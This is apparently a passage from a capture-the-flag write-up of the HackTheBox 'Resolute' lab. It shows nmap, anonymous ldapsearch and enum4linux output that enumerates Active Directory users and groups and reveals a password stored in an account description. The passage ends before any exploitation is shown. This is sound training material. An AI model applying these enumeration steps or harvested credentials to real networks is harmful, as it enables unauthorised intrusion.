---
date: 2020-05-30 23:48:05
layout: post
title: HackTheBox Resolute Writeup
subtitle: Hackthebox Resolute Writeup.
description: >-
  in this blog i've explained how to solve Resolute machine in hackthebox.
image: https://i.ibb.co/QX47ncp/Screenshot-2020-05-30-02-11-43.png
optimized_image: https://i.ibb.co/QX47ncp/Screenshot-2020-05-30-02-11-43.png
category: hackthebox
tags:
  - hackthebox
  - Resolute
author: Ahmed Fatouh
paginate: true
---


**hello guys this is a new writeup for a new retired machine, this is medium window machine, so let's start**

# []() Methodology:

* --> Nmap Scan
* --> Ldapsearch 
* --> enum4linux
* --> smb enumeration
* --> got first user
* --> Privilege Escalation.

# []() Nmap:

**now i will scan the services that runs in this machine with nmap so let's go**

**--> Domain Name: Megabank.local**
**--> Port 389 for Ldap**
**--> Port 445 for smb**
**This is a windows server 2016**

```ruby
nmap -sC -sV -oN scan.txt 10.10.10.169

Nmap scan report for 10.10.10.169
Host is up (1.1s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-16 06:06:17Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/16%Time=5E97F45A%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m27s, deviation: 4h02m31s, median: 6m26s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-04-15T23:08:52-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-16T06:08:51
|_  start_date: 2020-04-16T04:25:58
```
**from the nmap scan we know the important ports like ldap port and kerbros port so let's do some enumeration**

# []()ldapsearch

```ruby
ldapsearch -x- b "dc=megabank",dc=local" -H ldap://10.10.10.169


# Ulf Berg, Users, megabank.local
dn: CN=Ulf Berg,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ulf Berg
distinguishedName: CN=Ulf Berg,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213219.0Z
whenChanged: 20191203213220.0Z
uSNCreated: 102784
uSNChanged: 102788
name: Ulf Berg
objectGUID:: lxypMpJlw06yGw/QCXK7lw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198823399575646
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW0RkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ulf
sAMAccountType: 805306368
userPrincipalName: ulf@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Stevie Gerrard, Users, megabank.local
dn: CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Stevie Gerrard
distinguishedName: CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213313.0Z
whenChanged: 20191203213313.0Z
uSNCreated: 102794
uSNChanged: 102798
name: Stevie Gerrard
objectGUID:: cNhVNupy5U6xYh/b4OXEtA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198823934381342
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW0hkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: stevie
sAMAccountType: 805306368
userPrincipalName: stevie@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Claire Norman, Users, megabank.local
dn: CN=Claire Norman,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Claire Norman
distinguishedName: CN=Claire Norman,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213344.0Z
whenChanged: 20191203213344.0Z
uSNCreated: 102817
uSNChanged: 102821
name: Claire Norman
objectGUID:: wRiY2eNkWkuWN4vudCpGyA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198824248084501
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW0xkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: claire
sAMAccountType: 805306368
userPrincipalName: claire@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Paulo Alcobia, Users, megabank.local
dn: CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Paulo Alcobia
distinguishedName: CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213446.0Z
whenChanged: 20191203213446.0Z
uSNCreated: 102840
uSNChanged: 102844
name: Paulo Alcobia
objectGUID:: SO8gmFRshUq1jIfdrbY8Ow==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198824867454267
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW1BkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: paulo
sAMAccountType: 805306368
userPrincipalName: paulo@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Steve Rider, Users, megabank.local
dn: CN=Steve Rider,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Steve Rider
distinguishedName: CN=Steve Rider,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213525.0Z
whenChanged: 20191203213525.0Z
uSNCreated: 102846
uSNChanged: 102850
name: Steve Rider
objectGUID:: H8nxGjlEHUK2RPArEXf/lw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198825251259172
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW1RkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: steve
sAMAccountType: 805306368
userPrincipalName: steve@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Annette Nilsson, Users, megabank.local
dn: CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Annette Nilsson
distinguishedName: CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213655.0Z
whenChanged: 20191203213655.0Z
uSNCreated: 102884
uSNChanged: 102888
name: Annette Nilsson
objectGUID:: EcdWbLulEk62NOmrWiGS+A==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198826155923580
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW1hkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: annette
sAMAccountType: 805306368
userPrincipalName: annette@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Annika Larson, Users, megabank.local
dn: CN=Annika Larson,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Annika Larson
distinguishedName: CN=Annika Larson,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213723.0Z
whenChanged: 20191203213723.0Z
uSNCreated: 102890
uSNChanged: 102894
name: Annika Larson
objectGUID:: 1pYutFFQdkSJGNmDjsAnDQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198826436663777
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW1xkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: annika
sAMAccountType: 805306368
userPrincipalName: annika@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Per Olsson, Users, megabank.local
dn: CN=Per Olsson,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Per Olsson
distinguishedName: CN=Per Olsson,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213804.0Z
whenChanged: 20191203213812.0Z
uSNCreated: 102912
uSNChanged: 102916
name: Per Olsson
objectGUID:: VK6fEHrNL0mmrdODja31sg==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198826922786729
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW2BkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: per
sAMAccountType: 805306368
userPrincipalName: per@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Claude Segal, Users, megabank.local
dn: CN=Claude Segal,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Claude Segal
distinguishedName: CN=Claude Segal,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191203213956.0Z
whenChanged: 20191203213956.0Z
uSNCreated: 102950
uSNChanged: 102954
name: Claude Segal
objectGUID:: PRxc7O3B9kyc78To47uMRw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132198827964076214
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW2RkAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: claude
sAMAccountType: 805306368
userPrincipalName: claude@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Melanie Purkis, Users, megabank.local
dn: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Melanie Purkis
distinguishedName: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191204103845.0Z
whenChanged: 20200530004402.0Z
uSNCreated: 131130
memberOf: CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
uSNChanged: 148260
name: Melanie Purkis
objectGUID:: XYoyZXBbZk6QBuoYRsNkAg==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
logonHours:: ////////////////////////////
pwdLastSet: 132352730429398736
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWdScAAA==
accountExpires: 0
logonCount: 0
sAMAccountName: melanie
sAMAccountType: 805306368
userPrincipalName: melanie@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132352657118786419

# Zach Armstrong, Users, megabank.local
dn: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Zach Armstrong
distinguishedName: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191204103927.0Z
whenChanged: 20191204103927.0Z
uSNCreated: 131140
uSNChanged: 131144
name: Zach Armstrong
objectGUID:: /epL3PoS202KohXoJETmDg==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132199295678350932
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWdicAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: zach
sAMAccountType: 805306368
userPrincipalName: zach@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Simon Faraday, Users, megabank.local
dn: CN=Simon Faraday,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Simon Faraday
distinguishedName: CN=Simon Faraday,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191204103958.0Z
whenChanged: 20191204103958.0Z
uSNCreated: 131146
uSNChanged: 131150
name: Simon Faraday
objectGUID:: 6prPh1XLLkq6xAeT3rWI6w==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132199295985634433
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWdycAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: simon
sAMAccountType: 805306368
userPrincipalName: simon@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z

# Naoki Yamamoto, Users, megabank.local
dn: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Naoki Yamamoto
distinguishedName: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191204104044.0Z
whenChanged: 20191204104044.0Z
uSNCreated: 131152
uSNChanged: 131156
name: Naoki Yamamoto
objectGUID:: gABq//UsGkiGCoHHGQPA3Q==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132199296443424853
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWeCcAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: naoki
sAMAccountType: 805306368
userPrincipalName: naoki@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z
```
**from the ldap search we know the users and it's groups,etc.**
now we will use enum4linux

# []()enum4linux:
 enum4linux will give us clearly users and their groups.
 
 ```ruby
  ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.169    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.169    |
 ============================================ 
Looking up status of 10.10.10.169
No reply from 10.10.10.169

 ===================================== 
|    Session Check on 10.10.10.169    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.169 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.169    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.169    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.169 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.169 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ========================================= 
|    Share Enumeration on 10.10.10.169    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.169

 ==================================================== 
|    Password Policy Information for 10.10.10.169    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.169 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.169)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: Missing required parameter 'digestmod'.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.169    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
